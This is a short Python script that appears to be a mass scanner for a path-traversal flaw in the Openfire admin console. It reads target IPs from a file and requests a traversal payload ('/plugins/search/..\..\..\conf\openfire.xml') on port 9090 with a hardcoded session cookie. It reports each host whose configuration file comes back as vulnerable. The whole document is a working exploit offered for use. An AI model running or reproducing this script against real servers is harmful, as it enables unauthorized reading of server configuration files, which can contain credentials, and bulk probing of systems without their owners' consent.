# -*- coding: utf-8 -*-
# author:qxxaq
import requests


payload = '/plugins/search/..\..\..\conf\openfire.xml'
headers = {
    'Cookie': 'JSESSIONID=node01aaib5x4g4p781q3i2m2tm74u91.node0;'
}
def scan(ip):
    re = requests.get('http://'+ip+':9090'+payload,headers=headers,verify=False)
    res = re.text
    # print(re)
    if 'prop.name' in res:
         print(ip+'has been vulnrable!!')
    else:
        print(ip+"no!")


if __name__ == '__main__':
   file = open('href.txt')
   line = file.readline()
   while line:
       url = line.split('\n')[0]
       scan(url)
       line = file.readline()
   file.close()
